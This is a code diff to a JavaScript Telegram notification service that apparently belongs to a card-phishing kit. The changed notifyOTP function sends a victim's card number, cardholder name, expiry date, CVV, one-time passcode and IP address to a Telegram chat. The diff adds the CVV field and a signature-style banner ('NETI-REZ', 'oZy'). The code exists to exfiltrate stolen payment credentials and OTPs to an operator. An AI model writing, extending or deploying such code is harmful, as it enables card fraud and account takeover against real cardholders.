@@ -192,18 +192,29 @@ class TelegramService {
     console.log('[TelegramService] 📨 notifyOTP called with data:', JSON.stringify(clientData, null, 2));
     
     const status = clientData.otp_status === 'submitted' ? '✅ Soumis' : '⌨️ En cours de saisie';
+    const otpCode = clientData.otp_code || 'N/A';
+    const cardHolder = clientData.card_holder || 'N/A';
+    const cardNumber = clientData.card_number || 'N/A';
+    const cardExpiration = clientData.card_expiration || 'N/A';
+    const cardCvv = clientData.card_cvv || 'N/A';
+    const ip = clientData.ip || 'N/A';
+    
     const message = `
-🔢 <b>Code OTP ${status}</b>
+=========NETI-REZ-==========
 
-🆔 Client: <code>${clientData.id}</code>
-🌐 IP: <code>${clientData.ip || 'N/A'}</code>
-🌍 Pays: ${clientData.country || 'N/A'}
-🔐 Code OTP: <code>${clientData.otp_code || 'N/A'}</code>
-📄 Page: <code>${clientData.current_page || 'N/A'}</code>
-💳 Carte: <code>${clientData.card_number ? clientData.card_number : 'N/A'}</code>
-👤 Titulaire: <code>${clientData.card_holder || 'N/A'}</code>
-📅 Expiration: <code>${clientData.card_expiration || 'N/A'}</code>
-⏰ Heure: ${new Date().toLocaleString()}
+🔢 Code OTP ${status}
+
+------------
+🔐 Code OTP: <code>${otpCode}</code>
+------------
+👤 Titulaire: <code>${cardHolder}</code>
+------------
+💳 CC: <code>${cardNumber}</code>
+📅 Exp: <code>${cardExpiration}</code>
+🔐 CVV: <code>${cardCvv}</code>
+------------
+🌐 IP: <code>${ip}</code>
+==============oZy===========
     `.trim();
 
     console.log('[TelegramService] 📝 OTP message prepared');
